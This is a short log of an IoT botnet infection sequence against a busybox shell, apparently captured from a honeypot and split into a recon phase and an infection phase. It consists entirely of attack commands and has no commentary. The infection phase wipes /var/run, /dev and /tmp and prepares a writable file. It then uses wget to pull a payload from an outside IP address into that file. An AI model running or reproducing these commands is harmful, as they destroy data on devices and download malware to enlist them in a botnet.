### Recon phase
enable
shell
sh
/bin/busybox ZORRO
/bin/busybox wget
cat /proc/mounts && /bin/busybox ZORRO
/bin/busybox cat /bin/sh

### Infection phase
enable
shell
sh
/bin/busybox rm -rf /var/run/* /dev/* /tmp/* /var/run/* >/dev/null 2>&1; /bin/busybox WOPBOT
/bin/busybox mkdir -p /var/run; /bin/busybox WOPBOT
/bin/busybox cp -f /bin/sh /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox echo -ne '' > /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox chmod 777 /var/run/oMNUckLhyt; /bin/busybox WOPBOT
/bin/busybox wget -O - http://85.118.98.197:61050/cyka/blyat/2.mp > /var/run/oMNUckLhyt && /bin/busybox WOPBOT
